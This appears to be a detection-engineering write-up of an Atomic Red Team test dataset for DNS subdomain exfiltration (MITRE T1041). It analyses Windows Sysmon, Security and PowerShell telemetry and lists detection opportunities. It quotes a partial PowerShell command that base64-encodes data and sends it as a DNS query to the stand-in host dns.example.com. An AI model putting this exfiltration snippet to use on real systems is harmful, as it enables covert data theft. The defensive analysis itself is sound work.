# T1041-2: Exfiltration Over C2 Channel — Text Based Data Exfiltration using DNS Subdomains

## Technique Context

T1041 Exfiltration Over C2 Channel encompasses cases where adversaries reuse existing C2 infrastructure to carry stolen data. The DNS subdomain variant demonstrated here is a classic covert channel technique: data is base64-encoded, split into chunks of 63 characters or fewer, and each chunk is embedded as a subdomain of an attacker-controlled domain. The resulting queries — such as `U2VjcmV0RGF0YVRvRXhmaWx0cmF0ZQ==.dns.example.com` — appear to be ordinary DNS lookups, but the subdomains carry exfiltrated content to a server configured to log and decode them.

This method is effective in environments where direct HTTP or HTTPS egress is monitored or blocked, since DNS traffic is almost universally permitted. The attacker controls a nameserver for their domain and extracts data from query logs rather than direct connections. Detection approaches focus on unusually long subdomain labels (the 63-character limit is a known encoding artifact), high-entropy subdomain strings, DNS query volume anomalies, and use of PowerShell's `Resolve-DnsName` cmdlet in suspicious execution contexts.

## What This Dataset Contains

This dataset captures a complete DNS subdomain exfiltration attempt with no Defender blocking. The technique encoded the string `SecretDataToExfiltrate` in base64, producing `U2VjcmV0RGF0YVRvRXhmaWx0cmF0ZQ==`, and attempted to resolve `U2VjcmV0RGF0YVRvRXhmaWx0cmF0ZQ==.dns.example.com`.

Security EID 4688 shows the full exfiltration script in the spawned PowerShell process command line: `"powershell.exe" & {$dnsServer = "dns.example.com"; $exfiltratedData = "SecretDataToExfiltrate"; $chunkSize = 63; $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData); $encodedData = [Convert]::ToBase64String($encodedData); $chunks = $encodedData -split "(.{$chunkSize})..."`. This single event contains the complete technique implementation, exposing the target domain, the data, and the chunking logic.

Sysmon EID 1 captures the identical command line with parent process information: the child `powershell.exe` was spawned by the parent `powershell.exe` ART test framework.

Sysmon EID 22 is present in the full dataset (1 event confirmed in the EID breakdown) — this DNS query event records `QueryName: U2VjcmV0RGF0YVRvRXhmaWx0cmF0ZQ==.dns.example.com`. In the defended dataset this same event was present with `QueryStatus: 9560` (DNS_ERROR_RCODE_NAME_ERROR). In the undefended run, the DNS query was made but the domain doesn't exist, so the status is similar — the key difference is that no Defender blocking prevented the DNS resolution attempt itself.

The Sysmon channel contains 22 EID 7 image load events for the PowerShell process, including the .NET runtime stack: `mscoree.dll`, `mscoreei.dll`, `clr.dll`, `mscorlib.ni.dll`, and `clrjit.dll`. This is more DLL load activity than in the T1041-1 dataset, reflecting the use of `[Convert]::ToBase64String()` which engages additional .NET assemblies.

The PowerShell channel has 103 EID 4104 script block events and 2 EID 4103 module logging events. The module logging captures the actual `Resolve-DnsName` invocation with the base64-encoded subdomain.

Compared to the defended dataset (33 Sysmon, 12 Security, 47 PowerShell), the undefended run shows more PowerShell events (105 vs. 47) and more Sysmon ImageLoad events (22 vs. the defended breakdown). The defended version had more Security events (12 vs. 4), attributable to Defender generating additional process-related audit events during its blocking intervention.

## What This Dataset Does Not Contain

Multi-chunk exfiltration patterns are absent because `SecretDataToExfiltrate` base64-encodes to a single 44-character chunk (well under the 63-character limit), resulting in a single DNS query. Larger payloads would produce multiple sequential queries with incrementing chunk numbering, which is the more distinctive behavioral signature for detection. This dataset shows the mechanism but not the volume patterns.

The Sysmon EID 22 event is in the full stream but not among the 20 sampled sysmon events (which are all EID 7 ImageLoad). The full dataset provides the actual query name and status.

There are no Sysmon EID 3 network connection events, consistent with DNS queries being handled by the DNS resolver service rather than creating direct TCP/UDP connections attributable to the PowerShell process in Sysmon's network monitoring.

## Assessment

This dataset delivers strong process execution telemetry with the complete exfiltration script exposed in Security EID 4688. The single DNS query event, while limited in scope, documents the actual covert channel mechanic. For detection engineering purposes, the dataset is most useful for validating detections against the process creation indicator — the command line contains everything needed to identify the technique. The DNS telemetry, while present, reflects a minimal exfiltration payload.

Compared to the defended version, the primary addition is unimpeded execution: the DNS query was made, the .NET encoding routines completed, and PowerShell module logging captured the full cmdlet execution sequence. The defended run showed the same process creation indicators but with Defender's blocking footprint on top.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 showing `powershell.exe` spawning a child `powershell.exe` where the command line contains both `Convert::ToBase64String` and `Resolve-DnsName` — this combination directly identifies the encoding-and-DNS-query exfiltration pattern.

2. Sysmon EID 22 DNS query events where the `QueryName` subdomain portion is high-entropy and base64-decodable — queries matching the pattern `[A-Za-z0-9+/=]{20,63}\.<domain>` warrant investigation.

3. Sysmon EID 22 where `QueryName` contains a subdomain longer than 40 characters with no vowel patterns — legitimate domain labels rarely exceed 20 characters for infrastructure hostnames.

4. PowerShell EID 4104 script block text containing both `[Convert]::ToBase64String` and `Resolve-DnsName` in the same script block — this directly fingerprints the DNS subdomain exfiltration technique.

5. PowerShell EID 4103 module logging showing `Resolve-DnsName` called with a name parameter containing a base64 string pattern followed by a dot and attacker domain.

6. Sysmon EID 7 load of `.NET` runtime assemblies (`clr.dll`, `mscorlib`) into PowerShell immediately followed by EID 22 DNS queries — the heavy .NET loading preceding DNS activity is an unusual sequence for legitimate DNS lookups.

7. Process ancestry: `powershell.exe` (parent) spawning `powershell.exe` (child) where the child's process start time correlates with a burst of DNS queries to a non-infrastructure domain — this temporal correlation links the process execution to the DNS activity.
